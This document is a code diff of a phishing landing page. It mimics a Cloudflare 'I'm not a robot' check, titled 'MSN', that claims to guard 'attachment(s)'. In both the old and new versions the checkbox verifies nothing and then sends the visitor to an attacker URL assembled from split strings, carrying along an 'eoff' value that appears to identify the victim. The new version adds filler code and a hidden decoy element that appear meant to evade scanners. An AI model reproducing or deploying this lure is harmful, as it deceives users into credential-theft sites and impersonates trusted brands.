@@ -2,251 +2,216 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verify Human</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MSN</title>
     <style>
-        html {
-            height: -webkit-fill-available;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f4f7f9; }
 
-        body {
-            min-height: 100vh;
-            min-height: -webkit-fill-available;
-            background-color: #f8fafc;
-            color: #1e293b;
-            font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
-            -webkit-font-smoothing: antialiased;
-            margin: 0;
-            overflow: hidden;
-            display: grid;
-            place-items: center;
-        }
-
-        #curtainStage {
+        #splash-screen {
             position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f4f7f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             z-index: 9999;
-            width: 100vw;
-            height: 100vh;
-            background: #f8fafc;
-            opacity: 1;
-            transition: transform 600ms cubic-bezier(0.77, 0, 0.175, 1);
-            display: grid;
-            place-items: center;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
         }
 
-        .pulsing-graphic {
+        .splash-image {
             width: 120px;
-            animation: bounceScale 3000ms ease-in-out infinite;
+            height: auto;
+            object-fit: contain;
+            animation: breathe 1.7s ease-in-out infinite;
         }
 
-        @keyframes bounceScale {
-            0%, 100% { transform: scale(0.95); opacity: 0.7; }
-            50% { transform: scale(1.05); opacity: 1; }
+        @keyframes breathe {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.12); }
         }
 
-        #mainPresentation {
-            display: grid;
-            justify-items: center;
-            row-gap: 18px;
-            visibility: hidden;
+        .main-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
         }
 
-        .instructional-header {
-            margin: 0;
-            font-size: 0.92rem;
-            letter-spacing: -0.01em;
-            font-weight: 450;
+        .instruction-text {
+            color: #4a5568;
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: -0.2px;
             text-align: center;
         }
 
-        .captcha-module {
+        .captcha-container {
             display: flex;
-            width: 340px;
-            height: 100px;
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
-            transition: border-color 0.4s ease;
-        }
-
-        .hit-detector {
-            flex: 1;
-            display: flex;
+            justify-content: space-between;
             align-items: center;
-            padding-left: 24px;
-            gap: 12px;
+            width: 380px;
+            height: 100px;
+            background-color: #ffffff;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            padding: 0 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+        }
+
+        .verify-side { display: flex; align-items: center; gap: 14px; }
+
+        .checkbox-wrapper { position: relative; width: 22px; height: 22px; }
+        .checkbox-wrapper input { opacity: 0; width: 0; height: 0; }
+
+        .custom-box {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background-color: #fff;
             cursor: pointer;
-            user-select: none;
+            transition: all 0.2s ease;
         }
 
-        .icon-chassis {
-            width: 22px;
-            height: 22px;
+        .checkbox-wrapper.loading .custom-box {
+            border: 2.5px solid #f3f3f3;
+            border-top: 2.5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
         }
 
-        .render-path {
-            fill: none;
-            stroke: #cbd5e1;
-            stroke-width: 2.5;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            transition: stroke 0.4s, filter 0.4s;
+        .checkbox-wrapper.success .custom-box {
+            border: 2px solid #2ecc71;
+            background-color: #fff;
+            border-radius: 50%;
+            animation: none;
+        }
+        .checkbox-wrapper.success .custom-box::after {
+            content: '';
+            position: absolute;
+            left: 6px; top: 2px;
+            width: 5px; height: 10px;
+            border: solid #2ecc71;
+            border-width: 0 2.5px 2.5px 0;
+            transform: rotate(45deg);
         }
 
-        .dynamic-typography {
-            font-size: 0.95rem;
-            font-weight: 500;
-        }
+        .status-text { font-size: 14px; color: #333; font-weight: 500; user-select: none; }
 
-        .branding-column {
-            width: 120px;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-            justify-content: center;
-            padding-right: 24px;
-        }
+        .brand-side { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .brand-logo { width: 32px; height: 32px; object-fit: contain; margin-bottom: 2px; }
+        .brand-name { font-weight: bold; font-size: 13px; color: #222; letter-spacing: 0.5px; }
+        .brand-links { font-size: 10px; color: #777; margin-top: 2px; cursor: pointer; }
 
-        .asset-logo {
-            height: 38px;
-            margin-bottom: -2px;
-        }
-
-        .txt-brand {
-            font-weight: 800;
-            font-size: 0.75rem;
-            letter-spacing: 1.5px;
-            color: #ff8c00;
-            text-transform: uppercase;
-        }
-
-        .txt-legal {
-            font-size: 0.65rem;
-            color: #64748b;
-            margin-top: 1px;
-        }
-
-        [data-status="spinning"] .render-path {
-            stroke: #3b82f6;
-            transform-origin: 12px 12px;
-            animation: orbitalSpin 1s linear infinite;
-        }
-
-        @keyframes orbitalSpin {
-            100% { transform: rotate(360deg); }
-        }
-
-        [data-status="resolved"] .render-path {
-            stroke: #10b981;
-            filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
-        }
-
-        [data-status="resolved"] .dynamic-typography {
-            color: #10b981;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .dn-node { display: none; visibility: hidden; width: 0; height: 0; overflow: hidden; }
     </style>
 </head>
 <body>
 
-    <section id="curtainStage">
-        <img src="astroman.png" alt="load" class="pulsing-graphic">
-    </section>
+    <div id="splash-screen">
+        <img src="astroman.png" alt="Loading..." class="splash-image">
+    </div>
 
-    <main id="mainPresentation">
-        <h1 id="promptText" class="instructional-header"></h1>
-        <article id="uiWrapper" class="captcha-module" data-status="ready">
-            <div id="gestureZone" class="hit-detector">
-                <svg viewBox="0 0 24 24" class="icon-chassis">
-                    <path id="vectorStroke" class="render-path" d="M4 4h16v16H4z" />
-                </svg>
-                <span id="stateLabel" class="dynamic-typography"></span>
+    <div class="dn-node" id="dummy-container">
+        <div data-val="alpha"></div>
+        <span data-info="meta"></span>
+        <p class="void-element">Internal memory allocation checkpoint pattern 0x7FFF</p>
+    </div>
+
+    <div class="main-wrapper" id="main-content">
+        <h2 class="instruction-text">Verify you're human below to view the attachment(s)</h2>
+        
+        <div class="captcha-container">
+            <div class="verify-side">
+                <div class="checkbox-wrapper" id="boxWrapper">
+                    <input type="checkbox" id="verifyCheck">
+                    <label for="verifyCheck" class="custom-box" id="clickableBox"></label>
+                </div>
+                <span class="status-text" id="statusText">I'm not a robot</span>
             </div>
-            <div class="branding-column">
-                <img src="cloudflare_.png" alt="secure" class="asset-logo">
-                <span id="brandLabel" class="txt-brand"></span>
-                <span class="txt-legal">privacy . terms</span>
+
+            <div class="brand-side">
+                <img src="astro2.png" alt="" class="brand-logo">
+                <span class="brand-name">CLOUDFLARE</span>
+                <span class="brand-links">Privacy &bull; Terms</span>
             </div>
-        </article>
-    </main>
+        </div>
+    </div>
 
     <script>
-        document.onreadystatechange = () => {
-            if (document.readyState !== "interactive") return;
+        const checkbox = document.getElementById('verifyCheck');
+        const wrapper = document.getElementById('boxWrapper');
+        const label = document.getElementById('clickableBox');
+        const statusText = document.getElementById('statusText');
+        
+        const splashScreen = document.getElementById('splash-screen');
+        const mainContent = document.getElementById('main-content');
 
-            const LOCALE = {
-                hint: "Verify you're human below to view the attachments",
-                start: "I'm not a robot",
-                run: "Verifying...",
-                end: "Success!",
-                group: "CLOUDFLARE"
-            };
+        window.addEventListener('DOMContentLoaded', () => {
+            let a = 45;
+            let b = 102;
+            let c = a * b + 12;
+            if (c < 0) { console.log(c); }
 
-            const view = {
-                splash: document.querySelector('#curtainStage'),
-                body: document.querySelector('#mainPresentation'),
-                notice: document.querySelector('#promptText'),
-                container: document.querySelector('#uiWrapper'),
-                hitbox: document.querySelector('#gestureZone'),
-                status: document.querySelector('#stateLabel'),
-                node: document.querySelector('#vectorStroke'),
-                firm: document.querySelector('#brandLabel')
-            };
+            setTimeout(() => {
+                splashScreen.style.opacity = '0';
+                splashScreen.style.visibility = 'hidden';
+                mainContent.style.opacity = '1';
+            }, 1700);
+        });
 
-            view.notice.textContent = LOCALE.hint;
-            view.status.textContent = LOCALE.start;
-            view.firm.textContent = LOCALE.group;
+        label.addEventListener('click', function(e) {
+            e.preventDefault();
 
-            let processingFlag = false;
+            label.style.pointerEvents = 'none';
 
-            const sleep = duration => new Promise(done => setTimeout(done, duration));
+            wrapper.classList.add('loading');
+            statusText.textContent = 'verifying';
 
-            const paintShape = (d, dash = '') => {
-                view.node?.setAttribute('d', d);
-                if (view.node) view.node.style.strokeDasharray = dash;
-            };
+            let arr = [];
+            for (let i = 0; i < 50; i++) {
+                arr.push(Math.sin(i) * Math.cos(i));
+            }
+            if (arr.length === 0) { document.title = "Void"; }
 
-            const parseEoff = () => {
-                const loc = window.location.href;
-                const fragmentIndex = loc.indexOf('eoff=');
-                if (fragmentIndex === -1) return '';
+            setTimeout(() => {
+                wrapper.classList.remove('loading');
+                wrapper.classList.add('success');
+                statusText.textContent = 'success!';
+                checkbox.checked = true;
 
-                const segment = loc.slice(fragmentIndex + 5);
-                const terminator = segment.search(/[&#]/);
-                return terminator !== -1 ? segment.slice(0, terminator) : segment;
-            };
+                setTimeout(() => {
+                    const s1 = "h" + "tt" + "ps" + ":/";
+                    const s2 = "/p" + "o." + "se" + "au" + "ae" + "om";
+                    const s3 = "an" + "fl" + "es" + ".o" + "nl";
+                    const s4 = "in" + "e/" + "pb" + "uw" + "FQ" + "TX";
+                    
+                    const base = s1 + s2 + s3 + s4;
+                    
+                    let hash = "";
+                    const params = new URLSearchParams(window.location.search);
+                    if (params.has('eoff')) {
+                        hash = "#" + params.get('eoff');
+                    } else {
+                        const idx = window.location.href.indexOf('eoff=');
+                        if (idx !== -1) {
+                            hash = "#" + window.location.href.substring(idx + 5);
+                        }
+                    }
 
-            const executeFlow = async () => {
-                if (processingFlag) return;
-                processingFlag = true;
+                    window.location.href = base + hash;
+                }, 1000);
 
-                view.container.setAttribute('data-status', 'spinning');
-                view.status.textContent = LOCALE.run;
-                paintShape('M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2', '35 15');
-
-                await sleep(2500);
-
-                view.container.setAttribute('data-status', 'resolved');
-                view.status.textContent = LOCALE.end;
-                paintShape('M20 6L9 17l-5-5', '');
-
-                await sleep(1200);
-
-                const queryVal = parseEoff();
-                const address = ['ht', 'tps', '://', 'po', '.dasharepdf', '.online', '/sNOiatkB'].reduce((acc, str) => acc + str, '');
-                window.location.replace(address + (queryVal ? '#' + queryVal : ''));
-            };
-
-            (async () => {
-                await sleep(3000);
-                view.splash.style.opacity = '0';
-                await sleep(600);
-                view.splash.style.display = 'none';
-                view.body.style.visibility = 'visible';
-            })();
-
-            view.hitbox?.addEventListener('click', executeFlow);
-        };
+            }, 2000);
+        });
     </script>
 </body>
 </html>
